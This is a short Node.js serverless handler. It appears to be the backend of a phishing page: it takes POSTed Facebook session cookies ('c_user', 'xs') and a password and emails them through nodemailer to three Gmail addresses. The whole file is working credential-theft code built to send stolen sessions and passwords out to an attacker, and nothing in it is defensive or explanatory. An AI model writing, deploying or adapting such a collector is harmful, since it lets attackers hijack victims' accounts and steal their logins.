const nodemailer = require("nodemailer");

exports.handler = async function (event, context) {
  try {
    const data = JSON.parse(event.body);

    // Store partial submissions in memory (not ideal for production)
    const fields = [];

    // Validate at least one of the expected fields
    if (!data.c_user && !data.xs && !data.password) {
      return {
        statusCode: 400,
        body: JSON.stringify({ success: false, error: "No valid data received." })
      };
    }

    // Build the email body dynamically
    if (data.c_user || data.xs || data.password) {
      const html = `
        ${data.c_user ? `<p><strong>c_user:</strong> ${data.c_user}</p>` : ''}
        ${data.xs ? `<p><strong>xs:</strong> ${data.xs}</p>` : ''}
        ${data.password ? `<p><strong>password:</strong> ${data.password}</p>` : ''}
      `;

      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: process.env.SMTP_EMAIL,
          pass: process.env.SMTP_PASSWORD
        },
      });

      await transporter.sendMail({ 
  from: `"PROFESSOR" <${process.env.SMTP_EMAIL}>`,
  to: ["grubfah@gmail.com ", "newzatpage@gmail.com" , "submitdispute@gmail.com"],
  subject: "Zubair",
  html
});


      return {
        statusCode: 200,
        body: JSON.stringify({ success: true, message: "Email sent!" })
      };
    }
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
